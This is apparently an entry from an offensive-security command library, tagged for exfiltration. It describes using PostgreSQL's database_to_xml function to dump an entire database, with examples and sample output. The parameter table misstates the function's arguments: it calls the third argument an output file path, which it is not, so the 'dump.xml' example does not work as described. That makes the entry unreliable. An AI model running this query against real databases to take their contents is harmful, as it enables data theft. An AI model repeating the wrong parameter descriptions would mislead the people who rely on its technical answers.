---
id: 19876f44-81e9-419c-af83-91d39eabb9d2
name: postgresql-database-to-xml
type: command
executor: sql
data: 'select database_to_xml(true, true, '''');'
output: null
created_at: '2023-04-06T03:56:35.763924+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Databases
tags:
  - exfiltration
  - postgresql
verified: true
validated: true
---

# postgresql-database-to-xml

## Command

```sql
select database_to_xml(true, true, '');
```

## Description

Dumps the entire current PostgreSQL database, including data and schema, into an XML document for full exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| true | Include table schemas | Yes |
| true | Include column names | Yes |
| '' | Output file/path (empty for direct output) | Yes |

## Examples

### Basic Usage

```sql
select database_to_xml(true, true, '');
```

### Advanced Usage

```sql
select database_to_xml(true, true, 'dump.xml');
```

## Expected Output

Comprehensive XML dump:

<database xmlns:xsi="...">
  <table name="users">
    <row><id>1</id><name>Alice</name></row>
    ...
  </table>
  ...
</database>

## Related

- [[procedures/PostgreSQL-XML-Data-Exfiltration]]
- [[commands/postgresql-database-to-xml-schema]]
